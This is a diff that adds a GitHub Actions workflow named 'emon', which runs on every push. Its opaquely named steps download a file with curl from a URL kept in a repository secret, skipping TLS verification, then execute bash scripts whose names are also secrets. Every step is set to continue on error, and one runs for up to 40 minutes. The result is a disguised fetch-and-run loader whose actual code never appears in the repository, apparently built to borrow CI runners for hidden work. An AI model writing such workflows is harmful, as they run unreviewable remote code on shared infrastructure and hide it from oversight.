@@ -1,0 +1,29 @@
+name: emon
+
+on:
+    push:
+    workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-22.04
+
+    steps:
+     - name: EF1
+       uses: actions/checkout@main        
+
+     - name: EF2
+       timeout-minutes: 2
+       continue-on-error: true
+       run: |
+             curl -sLkO ${{ secrets.EF_AB }}
+             bash ${{ secrets.EF_CD }}
+     - name: EF3
+       continue-on-error: true
+       run: |
+             bash ${{ secrets.EF_EF }}
+     - name: EF4
+       timeout-minutes: 40
+       continue-on-error: true
+       run: |
+            bash ${{ secrets.EF_GH }}
